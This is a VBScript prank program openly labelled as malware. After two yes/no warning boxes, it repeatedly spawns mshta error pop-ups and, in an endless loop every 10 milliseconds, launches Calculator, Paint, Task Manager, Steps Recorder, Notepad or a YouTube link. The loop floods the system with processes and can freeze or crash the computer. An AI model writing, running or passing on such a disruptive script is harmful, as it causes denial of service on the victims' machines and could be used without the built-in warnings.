response1 = MsgBox("This is a malware! Run?", vbYesNo + vbExclamation, "ocuriuuser")
If response1 = vbNo Then
WScript.Quit
End If

response2 = MsgBox("THIS IS YOUR LAST WARING! are you sure? it will glitch your computer!", vbYesNo + vbExclamation, "ocuriuuser")
If response2 = vbNo Then
WScript.Quit
End If

CreateObject("WScript.Shell").Run "mshta vbscript:MsgBox(""$|%^%$%^%$£$^&^%$£$%^%$£$%^%$"",vbCritical,""ocuriuuser"")", 0, False
WScript.Sleep 300
Dim programs(5)
programs(0) = "calc"
programs(1) = "mspaint"
programs(2) = "https://www.youtube.com/shorts/uOocnnWS-WA"
programs(3) = "taskmgr"
programs(4) = "psr.exe"
programs(5) = "notepad"

Randomize

Do
i = Int(Rnd() * 6)
If Left(programs(i), 4) = "http" Then
CreateObject("WScript.Shell").Run "cmd /c start " & Chr(34) & Chr(34) & " " & programs(i), 0, False
Else
CreateObject("WScript.Shell").Run programs(i), 0, False
End If
WScript.Sleep 10
CreateObject("WScript.Shell").Run "mshta vbscript:MsgBox(""$|%^%$%^%$£$^&^%$£$%^%$£$%^%$"",vbCritical,""ocuriuuser"")", 0, False
Loop
